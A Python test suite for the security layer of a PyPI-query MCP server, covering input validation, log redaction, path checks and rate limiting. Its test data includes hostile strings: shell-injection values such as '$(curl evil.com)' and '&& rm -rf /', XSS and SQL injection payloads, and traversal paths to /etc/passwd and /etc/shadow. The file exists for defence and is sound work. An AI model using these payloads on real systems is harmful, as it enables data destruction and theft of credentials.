#!/usr/bin/env python3
"""Comprehensive security testing suite for mcpypi."""

import asyncio
import logging
import time
from pathlib import Path
from typing import Any, Dict, List
import pytest
import httpx
from unittest.mock import patch, MagicMock

# Configure logging for tests
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Import all security modules to test
from pypi_query_mcp.security.validation import (
    sanitize_for_logging,
    secure_validate_package_name,
    secure_validate_file_path,
    secure_validate_url,
    SecurityValidationError
)
from pypi_query_mcp.security.input_validator import (
    MCPInputValidator,
    validate_package_name,
    validate_search_query,
    validate_tool_params
)
from pypi_query_mcp.core.rate_limiter import (
    get_rate_limited_client,
    TokenBucket,
    RateLimiter,
    configure_service_limits,
    RateLimit
)
from pypi_query_mcp.core.rate_limit_config import (
    get_service_rate_limit,
    disable_rate_limiting,
    enable_rate_limiting
)


class SecurityTestSuite:
    """Comprehensive security testing suite."""

    def __init__(self):
        self.test_results = {
            "passed": 0,
            "failed": 0,
            "errors": [],
            "performance_metrics": {}
        }

    async def run_all_tests(self):
        """Run the complete security test suite."""
        logger.info("🔒 Starting Comprehensive Security Test Suite")
        logger.info("=" * 60)

        test_methods = [
            self.test_input_validation_attacks,
            self.test_log_sanitization_comprehensive,
            self.test_path_traversal_protection,
            self.test_rate_limiting_functionality,
            self.test_malicious_package_names,
            self.test_url_security_validation,
            self.test_json_injection_protection,
            self.test_performance_under_load,
            self.test_concurrent_rate_limiting,
            self.test_edge_cases_and_corner_cases
        ]

        for test_method in test_methods:
            try:
                logger.info(f"\n🧪 Running {test_method.__name__}")
                await test_method()
                self.test_results["passed"] += 1
                logger.info(f"✅ {test_method.__name__} PASSED")
            except Exception as e:
                self.test_results["failed"] += 1
                self.test_results["errors"].append(f"{test_method.__name__}: {str(e)}")
                logger.error(f"❌ {test_method.__name__} FAILED: {e}")

        self.print_final_results()

    async def test_input_validation_attacks(self):
        """Test input validation against various attack vectors."""
        logger.info("Testing input validation against attack vectors...")

        # Test malicious package names
        malicious_packages = [
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE packages; --",
            "package`echo malicious`",
            "$(curl evil.com)",
            "&& rm -rf /",
            "|cat /etc/passwd",
            "package\x00.exe",
            "a" * 300,  # Too long
            "",  # Empty
            "   ",  # Whitespace only
        ]

        for malicious_package in malicious_packages:
            try:
                validate_package_name(malicious_package)
                raise AssertionError(f"Malicious package name '{malicious_package}' was not rejected!")
            except SecurityValidationError:
                # This is expected - the validation should reject it
                logger.debug(f"✓ Correctly rejected: {malicious_package}")

        # Test malicious search queries
        malicious_queries = [
            "<iframe src=javascript:alert('xss')>",
            "javascript:void(0)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox('xss')",
            "onload=alert('xss')",
            "onerror=alert('xss')",
        ]

        for malicious_query in malicious_queries:
            try:
                validate_search_query(malicious_query)
                raise AssertionError(f"Malicious search query '{malicious_query}' was not rejected!")
            except SecurityValidationError:
                logger.debug(f"✓ Correctly rejected: {malicious_query}")

        logger.info("✅ Input validation successfully blocked all attack vectors")

    async def test_log_sanitization_comprehensive(self):
        """Test comprehensive log sanitization patterns."""
        logger.info("Testing comprehensive log sanitization...")

        # Test cases with expected sanitization
        test_cases = [
            # API tokens and keys
            ("token=pypi-AgEIcHlwaS5vcmcCJGY4NGIw", "token=***REDACTED***"),
            ("Authorization: Bearer ghp_1234567890abcdef", "Authorization: Bearer ***REDACTED***"),
            ("password=\"mysecret123\"", "password=***REDACTED***"),
            ("secret_key=sk-1234567890abcdef", "secret_key=***REDACTED***"),

            # GitHub tokens
            ("ghp_1234567890abcdef1234567890abcdef12345678", "***REDACTED_GITHUB_TOKEN***"),
            ("github_pat_11ABCDEFG0123456789012345678901234567890123456789012345678901234567890", "***REDACTED_GITHUB_PAT***"),

            # AWS credentials
            ("AKIAIOSFODNN7EXAMPLE", "***REDACTED_AWS_KEY***"),
            ("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "***REDACTED_AWS_SECRET***"),

            # Email addresses
            ("user@example.com", "***REDACTED_EMAIL***"),
            ("Contact support at admin@company.org", "Contact support at ***REDACTED_EMAIL***"),

            # URLs with credentials
            ("https://user:pass@github.com/repo.git", "***REDACTED_URL_WITH_CREDS***"),
            ("ftp://admin:secret@ftp.example.com/file", "***REDACTED_URL_WITH_CREDS***"),

            # File paths
            ("/home/john/secrets/file.txt", "/home/***USER***/secrets/file.txt"),
            ("/Users/alice/Documents/private", "/Users/***USER***/Documents/private"),

            # Private keys
            ("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----", "***REDACTED_PRIVATE_KEY***"),

            # Environment variables
            ("SECRET_KEY=mysecretvalue", "SECRET_KEY=***REDACTED***"),

            # Normal text should remain unchanged
            ("This is a normal log message", "This is a normal log message"),
        ]

        for original, expected_pattern in test_cases:
            sanitized = sanitize_for_logging(original)
            if expected_pattern not in sanitized and sanitized != expected_pattern:
                raise AssertionError(f"Sanitization failed for '{original}': got '{sanitized}', expected pattern '{expected_pattern}'")
            logger.debug(f"✓ Sanitized: {original[:30]}... → {sanitized[:30]}...")

        logger.info("✅ Log sanitization working correctly for all patterns")

    async def test_path_traversal_protection(self):
        """Test path traversal attack protection."""
        logger.info("Testing path traversal protection...")

        # Test malicious file paths
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "./../../etc/shadow",
            "~/../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/dev/urandom",
        ]

        for malicious_path in malicious_paths:
            try:
                result = secure_validate_file_path(malicious_path)
                if result.get("secure", True):
                    raise AssertionError(f"Malicious path '{malicious_path}' was not detected as insecure!")
            except SecurityValidationError:
                # This is expected for dangerous paths
                logger.debug(f"✓ Correctly rejected: {malicious_path}")

        # Test safe paths
        safe_paths = [
            "./safe_file.txt",
            "data/packages.json",
            "reports/analysis.pdf",
            "temp/download.zip",
        ]

        for safe_path in safe_paths:
            try:
                result = secure_validate_file_path(safe_path)
                if not result.get("valid", False):
                    raise AssertionError(f"Safe path '{safe_path}' was incorrectly rejected!")
                logger.debug(f"✓ Correctly accepted: {safe_path}")
            except SecurityValidationError as e:
                raise AssertionError(f"Safe path '{safe_path}' was incorrectly rejected: {e}")

        logger.info("✅ Path traversal protection working correctly")

    async def test_rate_limiting_functionality(self):
        """Test rate limiting functionality and performance."""
        logger.info("Testing rate limiting functionality...")

        # Test token bucket functionality
        bucket = TokenBucket(capacity=5, refill_rate=2.0)  # 5 tokens, refill 2/second

        # Should be able to consume initial tokens quickly
        start_time = time.time()
        for i in range(5):
            consumed = await bucket.consume()
            if not consumed:
                raise AssertionError(f"Failed to consume token {i+1} from fresh bucket")

        elapsed = time.time() - start_time
        if elapsed > 0.1:  # Should be nearly instantaneous
            raise AssertionError(f"Token consumption took too long: {elapsed}s")

        # Should fail to consume 6th token immediately
        consumed = await bucket.consume()
        if consumed:
            raise AssertionError("Token bucket allowed consumption beyond capacity")

        # Wait for refill and try again
        logger.info("Testing token bucket refill mechanism...")
        await asyncio.sleep(1.0)  # Wait for refill
        consumed = await bucket.consume()
        if not consumed:
            raise AssertionError("Token bucket did not refill as expected")

        logger.info("✅ Token bucket rate limiting working correctly")

    async def test_malicious_package_names(self):
        """Test package name validation against advanced attacks."""
        logger.info("Testing advanced malicious package name detection...")

        # Unicode and encoding attacks
        malicious_unicode = [
            "package\u0000hidden",  # Null byte
            "package\u200b\u200c\u200d",  # Zero-width characters
            "package\u202e\u202d",  # Bidirectional text override
            "package\uFEFF",  # Byte order mark
            "package\u2028\u2029",  # Line/paragraph separators
        ]

        for malicious_name in malicious_unicode:
            try:
                secure_validate_package_name(malicious_name)
                raise AssertionError(f"Malicious Unicode package name was not detected: {repr(malicious_name)}")
            except SecurityValidationError:
                logger.debug(f"✓ Correctly rejected Unicode attack: {repr(malicious_name)}")

        # Test legitimate package names
        legitimate_names = [
            "requests",
            "django-rest-framework",
            "numpy",
            "python-dateutil",
            "package_with_underscores",
            "package.with.dots",
            "a",  # Single character
            "package123",
        ]

        for name in legitimate_names:
            try:
                result = secure_validate_package_name(name)
                if not result.get("valid", False):
                    raise AssertionError(f"Legitimate package name was rejected: {name}")
                logger.debug(f"✓ Correctly accepted: {name}")
            except SecurityValidationError as e:
                raise AssertionError(f"Legitimate package name was rejected: {name} - {e}")

        logger.info("✅ Advanced package name validation working correctly")

    async def test_url_security_validation(self):
        """Test URL security validation."""
        logger.info("Testing URL security validation...")

        # Malicious URLs
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox('xss')",
            "file:///etc/passwd",
            "ftp://admin:secret@internal.server/",
            "ldap://evil.com/",
            "gopher://evil.com/",
        ]

        for malicious_url in malicious_urls:
            try:
                result = secure_validate_url(malicious_url)
                if result.get("secure", True):
                    raise AssertionError(f"Malicious URL was not detected: {malicious_url}")
            except SecurityValidationError:
                logger.debug(f"✓ Correctly rejected: {malicious_url}")

        # Safe URLs
        safe_urls = [
            "https://pypi.org/simple/",
            "https://github.com/user/repo",
            "https://api.github.com/repos/user/repo",
            "http://localhost:8080/api",
        ]

        for safe_url in safe_urls:
            try:
                result = secure_validate_url(safe_url)
                if not result.get("valid", False):
                    raise AssertionError(f"Safe URL was rejected: {safe_url}")
                logger.debug(f"✓ Correctly accepted: {safe_url}")
            except SecurityValidationError as e:
                raise AssertionError(f"Safe URL was rejected: {safe_url} - {e}")

        logger.info("✅ URL security validation working correctly")

    async def test_json_injection_protection(self):
        """Test JSON injection and depth limit protection."""
        logger.info("Testing JSON injection protection...")

        from pypi_query_mcp.security.validation import InputSanitizer

        # Test depth limit
        try:
            # Create deeply nested JSON
            deep_json = {"level": 1}
            current = deep_json
            for i in range(2, 15):  # Create 15 levels deep
                current["nested"] = {"level": i}
                current = current["nested"]

            InputSanitizer.validate_json_input(deep_json, max_depth=10)
            raise AssertionError("Deep JSON was not rejected")
        except SecurityValidationError:
            logger.debug("✓ Correctly rejected deeply nested JSON")

        # Test size limit
        try:
            large_json = {f"key_{i}": f"value_{i}" for i in range(2000)}
            InputSanitizer.validate_json_input(large_json, max_items=1000)
            raise AssertionError("Large JSON was not rejected")
        except SecurityValidationError:
            logger.debug("✓ Correctly rejected oversized JSON")

        # Test safe JSON
        safe_json = {
            "package": "requests",
            "version": "2.31.0",
            "dependencies": ["urllib3", "certifi"],
            "metadata": {
                "author": "Kenneth Reitz",
                "license": "Apache 2.0"
            }
        }

        try:
            InputSanitizer.validate_json_input(safe_json)
            logger.debug("✓ Correctly accepted safe JSON")
        except SecurityValidationError as e:
            raise AssertionError(f"Safe JSON was rejected: {e}")

        logger.info("✅ JSON injection protection working correctly")

    async def test_performance_under_load(self):
        """Test performance of security features under load."""
        logger.info("Testing performance under load...")

        # Test log sanitization performance
        test_string = "token=pypi-secret password=hidden email@example.com /home/user/file.txt"
        iterations = 1000

        start_time = time.time()
        for _ in range(iterations):
            sanitize_for_logging(test_string)
        sanitization_time = time.time() - start_time

        self.test_results["performance_metrics"]["log_sanitization"] = {
            "iterations": iterations,
            "total_time": sanitization_time,
            "per_operation": sanitization_time / iterations
        }

        if sanitization_time > 1.0:  # Should be fast
            logger.warning(f"Log sanitization is slow: {sanitization_time}s for {iterations} operations")
        else:
            logger.info(f"✓ Log sanitization performance good: {sanitization_time:.3f}s for {iterations} ops")

        # Test input validation performance
        start_time = time.time()
        for _ in range(iterations):
            try:
                validate_package_name("test-package")
            except:
                pass
        validation_time = time.time() - start_time

        self.test_results["performance_metrics"]["input_validation"] = {
            "iterations": iterations,
            "total_time": validation_time,
            "per_operation": validation_time / iterations
        }

        if validation_time > 2.0:
            logger.warning(f"Input validation is slow: {validation_time}s for {iterations} operations")
        else:
            logger.info(f"✓ Input validation performance good: {validation_time:.3f}s for {iterations} ops")

        logger.info("✅ Performance testing completed")

    async def test_concurrent_rate_limiting(self):
        """Test rate limiting under concurrent load."""
        logger.info("Testing concurrent rate limiting...")

        # Configure a strict rate limit for testing
        configure_service_limits("test", RateLimit(
            requests_per_second=5.0,
            burst_capacity=5,
            max_retries=1,
            backoff_factor=1.0
        ))

        client = get_rate_limited_client("test")

        async def make_request(request_id: int) -> Dict[str, Any]:
            """Make a single request and record timing."""
            start_time = time.time()
            try:
                # Mock HTTP request that should be rate limited
                with patch.object(client, '_get_client') as mock_client_ctx:
                    mock_response = MagicMock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {"success": True}

                    mock_client = MagicMock()
                    mock_client.request.return_value = mock_response
                    mock_client_ctx.return_value.__aenter__.return_value = mock_client

                    response = await client.get("https://api.example.com/test")

                end_time = time.time()
                return {
                    "request_id": request_id,
                    "success": True,
                    "duration": end_time - start_time,
                    "status": response.status_code
                }
            except Exception as e:
                end_time = time.time()
                return {
                    "request_id": request_id,
                    "success": False,
                    "duration": end_time - start_time,
                    "error": str(e)
                }

        # Launch concurrent requests
        concurrent_requests = 20
        start_time = time.time()

        tasks = [make_request(i) for i in range(concurrent_requests)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        total_time = time.time() - start_time

        # Analyze results
        successful_requests = [r for r in results if isinstance(r, dict) and r.get("success", False)]
        failed_requests = [r for r in results if isinstance(r, dict) and not r.get("success", True)]

        logger.info(f"Concurrent test: {len(successful_requests)} successful, {len(failed_requests)} failed")
        logger.info(f"Total time: {total_time:.2f}s")

        # Rate limiting should spread requests over time
        if total_time < 2.0:  # With 5 req/s limit and 20 requests, should take at least ~3 seconds
            logger.warning("Rate limiting may not be working - requests completed too quickly")
        else:
            logger.info("✓ Rate limiting properly throttled concurrent requests")

        await client.close()
        logger.info("✅ Concurrent rate limiting test completed")

    async def test_edge_cases_and_corner_cases(self):
        """Test edge cases and corner cases."""
        logger.info("Testing edge cases and corner cases...")

        # Test empty and None inputs
        edge_cases = [
            (None, "None input"),
            ("", "Empty string"),
            ("   ", "Whitespace only"),
            ("a" * 1000, "Very long input"),
            ("\x00\x01\x02", "Binary data"),
            ("🔒🚀💻", "Unicode emoji"),
        ]

        for test_input, description in edge_cases:
            try:
                # Test sanitization (should handle all inputs gracefully)
                sanitized = sanitize_for_logging(test_input)
                logger.debug(f"✓ Sanitization handled {description}: {len(str(sanitized))} chars")

                # Test package validation (should reject most edge cases)
                if test_input and isinstance(test_input, str) and test_input.strip():
                    try:
                        validate_package_name(test_input)
                        if len(test_input) > 214:  # PyPI limit
                            raise AssertionError(f"Oversized input was accepted: {description}")
                    except SecurityValidationError:
                        logger.debug(f"✓ Validation correctly rejected {description}")

            except Exception as e:
                logger.warning(f"Unexpected error with {description}: {e}")

        logger.info("✅ Edge case testing completed")

    def print_final_results(self):
        """Print final test results."""
        total_tests = self.test_results["passed"] + self.test_results["failed"]
        success_rate = (self.test_results["passed"] / total_tests * 100) if total_tests > 0 else 0

        logger.info("\n" + "=" * 60)
        logger.info("🔒 SECURITY TEST SUITE RESULTS")
        logger.info("=" * 60)
        logger.info(f"✅ Passed: {self.test_results['passed']}")
        logger.info(f"❌ Failed: {self.test_results['failed']}")
        logger.info(f"📊 Success Rate: {success_rate:.1f}%")

        if self.test_results["errors"]:
            logger.info("\n❌ ERRORS:")
            for error in self.test_results["errors"]:
                logger.error(f"   {error}")

        if self.test_results["performance_metrics"]:
            logger.info("\n📈 PERFORMANCE METRICS:")
            for metric, data in self.test_results["performance_metrics"].items():
                logger.info(f"   {metric}: {data['per_operation']*1000:.2f}ms per operation")

        logger.info("\n" + "=" * 60)

        if self.test_results["failed"] == 0:
            logger.info("🎉 ALL SECURITY TESTS PASSED! The codebase is properly hardened.")
        else:
            logger.warning("⚠️  Some security tests failed. Review and fix issues above.")


async def main():
    """Run the comprehensive security test suite."""
    suite = SecurityTestSuite()
    await suite.run_all_tests()


if __name__ == "__main__":
    asyncio.run(main())